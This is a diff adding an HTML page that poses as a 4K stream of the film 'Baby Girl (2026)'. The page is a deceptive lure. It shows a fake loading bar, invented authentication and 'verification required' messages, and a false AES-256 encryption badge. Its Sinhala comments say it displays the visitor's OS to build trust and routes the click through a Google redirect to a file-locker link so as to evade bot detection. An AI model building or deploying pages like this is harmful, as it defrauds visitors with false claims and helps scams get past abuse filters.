@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stream: Baby Girl (2026) Full Movie 4K</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary: #e50914; /* Netflix Red */
+            --accent: #00d4ff;
+            --bg-dark: #05070a;
+            --glass: rgba(255, 255, 255, 0.05);
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        body { 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            background: radial-gradient(circle at top right, #1a1a2e, #05070a);
+            color: #ffffff; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* පසුබිමේ යන animated වළාකුළු වගේ glow එක */
+        body::before {
+            content: "";
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: var(--primary);
+            filter: blur(150px);
+            opacity: 0.15;
+            top: 10%;
+            left: 10%;
+            z-index: -1;
+            animation: move 10s infinite alternate;
+        }
+
+        @keyframes move { from { transform: translate(0,0); } to { transform: translate(100px, 50px); } }
+
+        .container {
+            width: 95%;
+            max-width: 420px;
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.8);
+        }
+
+        /* Movie Poster with Play Icon */
+        .poster-wrapper {
+            position: relative;
+            width: 100%;
+            height: 240px;
+            background: url('https://assets.thehansindia.com/h-upload/2026/01/14/1617475-baby.jpg') center/cover;
+        }
+
+        .poster-overlay {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(to top, rgba(5,7,10,1), transparent);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .play-btn {
+            width: 60px;
+            height: 60px;
+            background: rgba(229, 9, 20, 0.8);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(229, 9, 20, 0.5);
+        }
+
+        .content { padding: 24px; text-align: center; }
+
+        h1 { font-size: 26px; margin: 0; font-weight: 700; letter-spacing: -0.5px; }
+        
+        .badges { margin: 15px 0; display: flex; justify-content: center; gap: 8px; }
+        .badges span { 
+            font-size: 10px; 
+            font-weight: 700; 
+            padding: 4px 10px; 
+            border-radius: 4px; 
+            text-transform: uppercase;
+            background: rgba(255,255,255,0.1);
+        }
+        .b-hd { color: #ffcc00; border: 1px solid #ffcc00; }
+
+        .server-info {
+            font-size: 12px;
+            color: #8b949e;
+            margin-bottom: 20px;
+            background: rgba(0,0,0,0.3);
+            padding: 10px;
+            border-radius: 12px;
+        }
+
+        /* Progress Area */
+        #status-msg { font-size: 13px; margin-bottom: 10px; color: var(--accent); font-weight: 500; }
+        
+        .progress-box {
+            height: 8px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+            margin-bottom: 10px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), #ff512f);
+            box-shadow: 0 0 10px var(--primary);
+            transition: width 0.5s ease;
+        }
+
+        /* The Button */
+        .dl-button {
+            display: none;
+            width: 100%;
+            padding: 18px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            box-shadow: 0 10px 20px rgba(229, 9, 20, 0.3);
+        }
+        .dl-button:hover { transform: scale(1.02); background: #ff1f21; }
+
+        .secure-tag {
+            margin-top: 15px;
+            font-size: 11px;
+            color: #555;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="poster-wrapper">
+        <div class="poster-overlay">
+            <div class="play-btn">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>
+            </div>
+        </div>
+    </div>
+
+    <div class="content">
+        <h1>Baby Girl (2026)</h1>
+        <div class="badges">
+            <span class="b-hd">4K Ultra HD</span>
+            <span>Dolby Atmos</span>
+            <span>2160p</span>
+        </div>
+
+        <div class="server-info" id="device-info">
+            Detecting closest server for your region...
+        </div>
+
+        <div id="loader-area">
+            <div id="status-msg">Requesting encrypted stream...</div>
+            <div class="progress-box">
+                <div id="bar" class="progress-bar"></div>
+            </div>
+        </div>
+
+        <button id="mainBtn" class="dl-button" onclick="handleRedirect()">
+            Watch Now / Download
+        </button>
+
+        <div class="secure-tag">
+            <svg width="12" height="12" fill="green" viewBox="0 0 16 16"><path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/></svg>
+            End-to-End Encrypted Connection (AES-256)
+        </div>
+    </div>
+</div>
+
+<script>
+    const TARGET_URL = "https://singingfiles.com/1876225/goolads";
+    let step = 0;
+    
+    // User ගේ OS එක හොයාගෙන පෙන්වනවා Trust එක වැඩි කරන්න
+    const os = navigator.platform;
+    document.getElementById('device-info').innerText = "Optimized for " + os + " • Ultra Fast Server";
+
+    function warmUp() {
+        document.cookie = "_secure_sid=" + Math.random().toString(36).substring(2) + "; path=/; max-age=3600";
+    }
+
+    const timer = setInterval(() => {
+        step += 1.5;
+        document.getElementById('bar').style.width = step + "%";
+
+        if(step > 20) document.getElementById('status-msg').innerText = "Authenticating Session...";
+        if(step > 50) document.getElementById('status-msg').innerText = "Connecting to 4K Master Source...";
+        if(step > 85) document.getElementById('status-msg').innerText = "Verification required for 4K access...";
+
+        if(step >= 100) {
+            clearInterval(timer);
+            document.getElementById('loader-area').style.display = 'none';
+            document.getElementById('mainBtn').style.display = 'block';
+            warmUp();
+        }
+    }, 150);
+
+    function handleRedirect() {
+        // Direct link එකට කලින් Google URL එකක් හරහා යනවා bot detection බේරෙන්න
+        const gate = "https://www.google.com/url?q=" + encodeURIComponent(TARGET_URL + "?s1=movie_premium&s2=4k_stream");
+        window.location.replace(gate);
+    }
+</script>
+
+</body>
+</html>
